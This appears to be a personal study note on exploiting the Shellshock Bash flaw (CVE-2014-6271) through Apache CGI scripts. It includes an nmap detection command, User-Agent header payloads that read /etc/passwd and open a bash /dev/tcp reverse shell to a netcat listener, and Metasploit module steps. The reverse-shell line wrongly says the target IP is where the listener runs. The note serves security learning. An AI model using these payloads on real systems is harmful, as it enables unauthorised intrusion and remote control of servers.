## Bash CVE-2014-6271 vulnerability (Shellshock)

* **What is Bash** --> A *Nix shell that is part of the GNU project and is the default shell for most Linux distributions. --> Default shell for most of the Linux distributions (eg: Ubuntu, Debian, arch Linux, Fedora,etc.)
* This vulnerability involves two services: Apache and Bash
* Shellshock --> name given to a family of vulnerabilities in the Bash shell (since v1.3), and hence only in Linux systems
* Allows an attacker to execute commands via Bash and obtain access to a reverse shell on the target.
* **WHY** --> Due to Bash mistakenly executing trailing commands after a series of characters --> (){:;};
* **What affect in the context of remote exploitation** --> Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
* **What is CGI** --> Common Gateway INterface scripts are used by Apache to execute arbitrary commands on the Linux system --> after which the output is displayed to the client.

* **How to exploit**
  * In short, locate an input vector or script that allows us to communicate with Bash.
  * In the context of an Apache web server --> utilize a legitiimate CGI scripts accessible on the web server.
  * When a CGI script is executed (means when an HTTP web request is made with that CGI script), the web server will initiate a new process and run the CGI script with Bash (By adding the characters mentioned above in the HTTP headers and then specify the malicious commands after these characters)
  * Two ways:
       1. Manual way --> Burp proxy
       2. Automatic way --> MSF exploit module
   
## PRACTICAL
* Check in the page source of the target IP inside a browser, if you can see a CGI script running on the system.
* **How to check if a system is vulnerable to Shellshock attack**
  * `nmap -sV --script=http-shellshock -script-args "http-shellshcok.uri=[path of the CGI script on the target, in this case /gettime.cgi]" [target IP]`
 
### 1. Burp Suite
* FoxyProxy can be used to switch between proxies inside a web browser. Burp profile can be created inside this web extension.
* Then open the tool installed on Kali Linux: Burp Suite
* Select the default settings to start the project.
* Make sure that "Intercept is On" inside the "Proxy" tab. If we reload the page with CGI scrip, it should be intercepted by Burp Suite now.
* Malicious commands have to be inserted in "User-Agent" section inside "Proxy" tab.
* Inside "User-agent" --> `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
* Right-click --> "Send to Repeater" --> Move to the "Repeater" tab --> Click "Send"  -> This will display the output of the command.
* **Gain a reverse shell on the target**
      * Utilize bash to connect to a listener on our Kali Linux system
      * `nc -nvlp 1234` --> Using netcat to start a listener on any free port
      * Inside Burp suite: User-Agent --> `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/[Target IP]/[port on which listener was setup,i.e. 1234] 0>&1`
      * Click "Send" --> This should provide a shell where listener was executed.  
### 2. Metasploit
* `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
* `set rhosts`
* `set targeturi [path of the CGI script on the target, in this case /gettime.cgi]`
* `exploit`
